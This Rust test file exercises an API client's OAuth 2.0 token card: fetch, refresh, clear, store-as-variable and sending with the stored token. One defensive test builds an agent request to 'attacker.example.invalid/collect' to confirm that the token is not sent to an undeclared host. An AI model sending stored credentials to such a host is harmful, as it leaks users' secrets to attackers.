//! The OAuth 2.0 token card: fetch (client credentials and PKCE with a loopback redirect), status,
//! refresh, clear, store-as-variable and the send path that reads the stored token.

use std::io::{Read, Write};
use std::net::TcpStream;
use std::sync::Arc;
use std::time::Duration;

use super::support::TestServer;
use crate::app::oauth_service::{BrowserOpener, fetch_with};
use crate::app::{
    AppState, ExecuteRequestInput, OAuthTokenInput, oauth_token_clear_impl,
    oauth_token_refresh_impl, oauth_token_status_impl, oauth_token_store_as_impl,
    request_execute_impl, workspace_create_impl,
};
use crate::workspace::{AuthConfig, Environment, EnvironmentVariable, OAuth2GrantType, Request};

const CC_TOKEN: &str = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: 94\r\n\r\n{\"access_token\":\"cc_access_token_1234\",\"token_type\":\"Bearer\",\"expires_in\":3600,\"scope\":\"read\"}";
const PKCE_TOKEN: &str = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: 144\r\n\r\n{\"access_token\":\"pkce_access_token_5678\",\"token_type\":\"Bearer\",\"expires_in\":3600,\"refresh_token\":\"pkce_refresh_token_9012\",\"scope\":\"read write\"}";
const REFRESHED_TOKEN: &str = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: 86\r\n\r\n{\"access_token\":\"refreshed_access_token_3456\",\"token_type\":\"Bearer\",\"expires_in\":3600}";
const OK_JSON: &str =
    "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: 11\r\n\r\n{\"ok\":true}";

/// A token endpoint that answers each connection with the next canned response and hands the
/// requests back with their original case (the shared `TestServer` lower-cases them, which would
/// ruin a base64url `code_verifier`).
struct RawServer {
    base_url: String,
    requests: std::sync::mpsc::Receiver<String>,
}

impl RawServer {
    fn spawn(responses: Vec<&'static str>) -> Self {
        let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("bind");
        let base_url = format!("http://{}", listener.local_addr().expect("address"));
        let (sender, requests) = std::sync::mpsc::channel();
        std::thread::spawn(move || {
            for response in responses {
                let Ok((mut stream, _)) = listener.accept() else {
                    return;
                };
                let request = super::support::read_complete_request(&mut stream);
                let _ = sender.send(String::from_utf8_lossy(&request).into_owned());
                let _ = stream.write_all(response.as_bytes());
            }
        });
        Self { base_url, requests }
    }

    fn received(&self, count: usize) -> Vec<String> {
        (0..count)
            .map(|_| {
                self.requests
                    .recv_timeout(Duration::from_secs(5))
                    .expect("the token endpoint receives the request")
            })
            .collect()
    }
}

fn auth(grant: OAuth2GrantType, token_url: &str) -> AuthConfig {
    AuthConfig::OAuth2 {
        grant_type: grant,
        access_token_url: token_url.into(),
        client_id: "client".into(),
        client_secret_ref: "shh".into(),
        username: String::new(),
        password_ref: String::new(),
        scope: "read".into(),
        authorization_url: if grant == OAuth2GrantType::AuthorizationCodePkce {
            "https://auth.example/authorize".into()
        } else {
            String::new()
        },
        redirect_port: None,
        client_auth: Default::default(),
        extra_params: Vec::new(),
    }
}

fn input(auth: AuthConfig) -> OAuthTokenInput {
    OAuthTokenInput {
        workspace_id: "ws_oauth".into(),
        auth,
        ..Default::default()
    }
}

fn state() -> AppState {
    let state = AppState::open_in_memory().expect("state");
    workspace_create_impl(&state, "ws_oauth".into(), "OAuth".into()).expect("workspace");
    state
}

/// A "browser" that follows the authorization URL straight back to the loopback redirect and
/// reports the URL it was given.
fn browser(code: &'static str, seen: std::sync::mpsc::Sender<url::Url>) -> BrowserOpener {
    Arc::new(move |authorize| {
        let url = url::Url::parse(authorize).expect("authorization url");
        let query = |name: &str| {
            url.query_pairs()
                .find(|(key, _)| key == name)
                .map(|(_, value)| value.into_owned())
                .expect("query parameter")
        };
        let redirect = url::Url::parse(&query("redirect_uri")).expect("redirect uri");
        let target = format!("{}?code={code}&state={}", redirect.path(), query("state"));
        let port = redirect.port().expect("port");
        seen.send(url).expect("seen");
        std::thread::spawn(move || {
            let mut stream = TcpStream::connect(("127.0.0.1", port)).expect("redirect");
            write!(stream, "GET {target} HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n").expect("write");
            let mut reply = String::new();
            let _ = stream.read_to_string(&mut reply);
        });
        Ok(())
    })
}

fn nothing() -> BrowserOpener {
    Arc::new(|_| Ok(()))
}

#[tokio::test]
async fn client_credentials_fetch_stores_the_token_and_reports_only_facts() {
    let server = TestServer::spawn(CC_TOKEN);
    let state = state();
    let input = input(auth(
        OAuth2GrantType::ClientCredentials,
        &format!("{}/token", server.base_url),
    ));
    assert_eq!(
        oauth_token_status_impl(&state, &input).expect("status"),
        None
    );

    let info = fetch_with(
        &state,
        input.clone(),
        None,
        nothing(),
        Duration::from_secs(5),
    )
    .await
    .expect("fetch");
    assert_eq!(info.token_type, "Bearer");
    assert_eq!(info.last4, "1234");
    assert_eq!(info.scope, "read");
    assert!(info.expires_at_ms.is_some() && !info.has_refresh);
    let json = serde_json::to_string(&info).expect("json");
    assert!(!json.contains("cc_access_token"));
    let sent = server.received_request();
    assert!(sent.contains("grant_type=client_credentials") && sent.contains("client_secret=shh"));

    assert_eq!(
        oauth_token_status_impl(&state, &input).expect("status"),
        Some(info)
    );
    oauth_token_clear_impl(&state, &input).expect("clear");
    assert_eq!(
        oauth_token_status_impl(&state, &input).expect("status"),
        None
    );
    assert!(
        state
            .secrets()
            .active_redaction_needles()
            .iter()
            .all(|needle| !needle.contains("cc_access_token"))
    );
}

#[tokio::test]
async fn pkce_fetch_sends_a_s256_challenge_and_proves_it_with_the_verifier() {
    let server = RawServer::spawn(vec![PKCE_TOKEN, REFRESHED_TOKEN]);
    let state = state();
    let input = input(auth(
        OAuth2GrantType::AuthorizationCodePkce,
        &format!("{}/token", server.base_url),
    ));
    let (seen, opened) = std::sync::mpsc::channel();

    let info = fetch_with(
        &state,
        input.clone(),
        None,
        browser("auth-code-1", seen),
        Duration::from_secs(10),
    )
    .await
    .expect("fetch");
    assert_eq!((info.last4.as_str(), info.has_refresh), ("5678", true));
    assert_eq!(info.scope, "read write");

    let authorize = opened.recv().expect("opened");
    assert_eq!(authorize.host_str(), Some("auth.example"));
    let query = |name: &str| {
        authorize
            .query_pairs()
            .find(|(key, _)| key == name)
            .map(|(_, value)| value.into_owned())
    };
    assert_eq!(query("response_type").as_deref(), Some("code"));
    assert_eq!(query("code_challenge_method").as_deref(), Some("S256"));
    assert!(query("redirect_uri").is_some_and(|uri| uri.starts_with("http://127.0.0.1:")));

    // Refresh uses the stored refresh token and keeps it when the server omits a new one.
    let refreshed = oauth_token_refresh_impl(&state, input.clone(), None)
        .await
        .expect("refresh");
    assert_eq!(refreshed.last4, "3456");
    assert!(refreshed.has_refresh);

    let requests = server.received(2);
    assert!(requests[0].contains("grant_type=authorization_code"));
    assert!(requests[0].contains("code=auth-code-1"));
    assert!(requests[0].contains("redirect_uri=http%3A%2F%2F127.0.0.1%3A"));
    let verifier = requests[0]
        .split("code_verifier=")
        .nth(1)
        .and_then(|rest| rest.split('&').next())
        .expect("code_verifier");
    use base64::Engine as _;
    assert_eq!(
        query("code_challenge").expect("challenge"),
        base64::engine::general_purpose::URL_SAFE_NO_PAD
            .encode(crate::crypto::sha256(verifier.as_bytes()))
    );
    assert!(requests[1].contains("grant_type=refresh_token"));
    assert!(requests[1].contains("refresh_token=pkce_refresh_token_9012"));
}

#[tokio::test]
async fn a_pkce_wait_ends_on_cancel_and_on_timeout() {
    let state = state();
    let input = input(auth(
        OAuth2GrantType::AuthorizationCodePkce,
        "http://127.0.0.1:9/token",
    ));

    let (result, ()) = tokio::join!(
        fetch_with(
            &state,
            input.clone(),
            Some("oauth-cancel".into()),
            nothing(),
            Duration::from_secs(30),
        ),
        async {
            // The registration happens when the command starts: retry like the UI does.
            for _ in 0..100 {
                if crate::app::execution_cancel_impl(&state, "oauth-cancel".into()) {
                    return;
                }
                tokio::time::sleep(Duration::from_millis(20)).await;
            }
        }
    );
    assert!(result.expect_err("cancelled").is_cancelled());

    let timed_out = fetch_with(&state, input, None, nothing(), Duration::from_millis(60))
        .await
        .expect_err("timeout");
    assert!(timed_out.message().contains("in time"));
}

#[tokio::test]
async fn the_commands_validate_the_configuration() {
    let state = state();
    let not_oauth = input(AuthConfig::None);
    assert!(oauth_token_status_impl(&state, &not_oauth).is_err());
    let relative = input(auth(OAuth2GrantType::ClientCredentials, "/token"));
    let error = fetch_with(&state, relative, None, nothing(), Duration::from_secs(1))
        .await
        .expect_err("relative url");
    assert!(error.message().contains("Access token URL"));
    let mut pkce = auth(
        OAuth2GrantType::AuthorizationCodePkce,
        "http://127.0.0.1:9/token",
    );
    if let AuthConfig::OAuth2 {
        authorization_url, ..
    } = &mut pkce
    {
        authorization_url.clear();
    }
    let error = fetch_with(&state, input(pkce), None, nothing(), Duration::from_secs(1))
        .await
        .expect_err("no authorization url");
    assert!(error.message().contains("Authorization URL"));
    assert!(
        oauth_token_refresh_impl(
            &state,
            input(auth(
                OAuth2GrantType::ClientCredentials,
                "http://127.0.0.1:9/t"
            )),
            None
        )
        .await
        .expect_err("nothing to refresh")
        .message()
        .contains("refresh token")
    );
}

#[tokio::test]
async fn store_as_variable_writes_a_secret_and_keeps_every_other_variable() {
    let server = TestServer::spawn(CC_TOKEN);
    let state = state();
    let mut environment = Environment::new("env_a", "ws_oauth", "Local").expect("environment");
    environment.variables = vec![
        EnvironmentVariable::plain("base", "https://api.example").expect("plain"),
        EnvironmentVariable::masked("keep", "kept-secret-value").expect("masked"),
        EnvironmentVariable::plain("access", "stale").expect("plain"),
    ];
    state.store().save_environment(&environment).expect("saved");
    let mut input = input(auth(
        OAuth2GrantType::ClientCredentials,
        &format!("{}/token", server.base_url),
    ));
    input.environment_id = Some("env_a".into());

    fetch_with(
        &state,
        input.clone(),
        None,
        nothing(),
        Duration::from_secs(5),
    )
    .await
    .expect("fetch");
    oauth_token_store_as_impl(&state, &input, "access").expect("stored as variable");
    oauth_token_store_as_impl(&state, &input, "fresh").expect("stored as new variable");

    let saved = state
        .store()
        .get_environment(
            &crate::workspace::WorkspaceId::new("ws_oauth").expect("id"),
            &crate::workspace::EnvironmentId::new("env_a").expect("id"),
        )
        .expect("read")
        .expect("environment");
    let variable = |key: &str| {
        saved
            .variables
            .iter()
            .find(|variable| variable.key == key)
            .expect("variable")
    };
    assert_eq!(
        variable("base").value.as_deref(),
        Some("https://api.example")
    );
    assert_eq!(variable("keep").value.as_deref(), Some("kept-secret-value"));
    assert!(variable("keep").is_secret);
    for key in ["access", "fresh"] {
        assert!(variable(key).is_secret && variable(key).enabled, "{key}");
        assert_eq!(variable(key).value.as_deref(), Some("cc_access_token_1234"));
    }

    let mut without_environment = input;
    without_environment.environment_id = None;
    assert!(oauth_token_store_as_impl(&state, &without_environment, "x").is_err());
}

#[tokio::test]
async fn a_send_uses_the_stored_token_and_history_never_holds_it() {
    let token_card = TestServer::spawn(PKCE_TOKEN);
    let api = TestServer::spawn(OK_JSON);
    let state = state();
    let pkce = auth(
        OAuth2GrantType::AuthorizationCodePkce,
        &format!("{}/token", token_card.base_url),
    );
    let mut request = Request::new(
        "req_pkce",
        "ws_oauth",
        "Protected",
        format!("{}/resource", api.base_url),
    )
    .expect("request");
    request.auth = pkce.clone();
    state.store().save_request(&request).expect("saved");
    let send = || {
        request_execute_impl(
            &state,
            ExecuteRequestInput {
                workspace_id: "ws_oauth".into(),
                request_id: "req_pkce".into(),
                ..Default::default()
            },
            None,
        )
    };

    // No token yet: nothing is sent and the message points at the card.
    let error = send().await.expect_err("no token");
    assert!(error.message().contains("token card"));

    let (seen, _opened) = std::sync::mpsc::channel();
    fetch_with(
        &state,
        input(pkce),
        None,
        browser("code-2", seen),
        Duration::from_secs(10),
    )
    .await
    .expect("fetch");
    assert_eq!(send().await.expect("sent").status_code, 200);
    assert!(
        api.received_request()
            .contains("authorization: bearer pkce_access_token_5678")
    );

    let history =
        super::support::history_list(&state, "ws_oauth".into(), None, None).expect("history");
    assert!(
        !serde_json::to_string(&history)
            .expect("json")
            .contains("pkce_access_token")
    );
}

/// The stored token is looked up by guessable, non-secret fields, so an agent request that
/// inherits the OAuth 2.0 auth must not send it to a host the environment does not declare.
#[tokio::test]
async fn an_agent_send_never_carries_a_stored_oauth_token_to_an_undeclared_host() {
    let token_card = TestServer::spawn(CC_TOKEN);
    let state = state();
    let oauth = auth(
        OAuth2GrantType::ClientCredentials,
        &format!("{}/token", token_card.base_url),
    );
    fetch_with(
        &state,
        input(oauth.clone()),
        None,
        nothing(),
        Duration::from_secs(5),
    )
    .await
    .expect("fetch");
    let mut request = Request::new(
        "req_agent_steal",
        "ws_oauth",
        "Steal",
        "http://attacker.example.invalid/collect",
    )
    .expect("request");
    request.auth = oauth;
    let context = {
        let store = state.store();
        crate::app::execution_context(&store, &request, None).expect("context")
    };

    let error = crate::app::execute_request_pipeline(
        &state,
        request,
        context,
        crate::app::ExecutionMeta::default(),
        None,
        crate::app::Persistence::Record(crate::workspace::HistoryOrigin {
            source: crate::workspace::HistorySource::Agent,
            source_name: "agent".into(),
            source_id: String::new(),
            run_id: None,
        }),
    )
    .await
    .expect_err("an undeclared host must be refused");

    assert!(
        matches!(error, crate::error::AppError::Validation { .. }),
        "{error:?}"
    );
    assert!(
        error.message().contains("OAuth 2.0 token can only be sent"),
        "{error}"
    );
}

/// A token URL kept in a collection variable resolves in the card exactly as at send time.
#[test]
fn the_token_card_resolves_collection_variables_like_the_send_path() {
    let state = state();
    let mut collection =
        crate::workspace::Collection::new("col_oauth", "ws_oauth", "Scoped").expect("collection");
    collection.variables = vec![
        EnvironmentVariable::plain("token_url", "https://auth.example/token").expect("variable"),
    ];
    let mut request =
        Request::new("req_scoped", "ws_oauth", "Scoped", "https://api.example/").expect("request");
    request.collection_id = Some(collection.id.clone());
    {
        let store = state.store();
        store
            .save_collection(&collection)
            .expect("collection saved");
        store.save_request(&request).expect("request saved");
    }
    let mut config = auth(OAuth2GrantType::ClientCredentials, "{{token_url}}");
    if let AuthConfig::OAuth2 { client_id, .. } = &mut config {
        *client_id = "client-1".into();
    }

    let plain = input(config.clone());
    assert!(oauth_token_status_impl(&state, &plain).is_err());
    let by_request = OAuthTokenInput {
        request_id: Some("req_scoped".into()),
        ..plain.clone()
    };
    assert_eq!(
        oauth_token_status_impl(&state, &by_request).expect("status"),
        None
    );
    let by_collection = OAuthTokenInput {
        collection_id: Some("col_oauth".into()),
        ..plain
    };
    assert_eq!(
        oauth_token_status_impl(&state, &by_collection).expect("status"),
        None
    );
}
